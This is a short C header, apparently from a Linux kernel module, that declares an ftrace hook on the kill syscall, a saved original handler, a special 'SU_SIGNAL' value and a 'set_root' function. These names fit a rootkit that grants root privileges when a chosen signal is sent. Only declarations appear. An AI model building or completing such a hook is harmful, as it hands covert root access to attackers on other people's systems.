#ifndef HOOKS_HEADER
#define HOOKS_HEADER

#include "ftrace_helper.h"

extern uint8_t SU_SIGNAL;

extern asmlinkage long (*orig_kill)(const struct pt_regs *);

void set_root(void);

asmlinkage long hook_kill(const struct pt_regs* regs);


#endif